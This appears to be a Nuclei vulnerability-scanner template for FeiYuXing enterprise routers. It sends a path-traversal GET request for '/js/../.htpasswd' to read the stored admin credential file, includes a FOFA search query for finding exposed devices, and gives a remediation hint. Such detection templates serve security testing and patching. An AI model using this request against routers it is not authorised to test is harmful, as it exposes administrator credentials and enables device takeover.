http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/plain")
    - contains_all(body, "$", ":")
    - contains(server, "Router Web")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/js/../.htpasswd'
id: feiyuxing-ent-router-infoleak
info:
  author: adeljck
  description: 'The FeiYuXing Enterprise Router Information Leakage Vulnerability
    is a critical flaw that allows unauthorized attackers to retrieve sensitive configuration
    details from the router.

    '
  impact: 'Exploiting this vulnerability enables an attacker to gain access to stored
    credentials, including administrative usernames and passwords, which can lead
    to a complete compromise of the device.

    '
  metadata:
    fofa-query: body="js/select2css.js"
    max-request: 1
    verified: true
  name: FeiYuXing Enterprise Router - Information Leakage
  remediation: 'Update the frimware to the latest version. If your device is out of
    service.add path /js/../.htpasswd to your WAF.

    '
  severity: high
  tags: feiyuxing,info-leak,disclosure,vuln
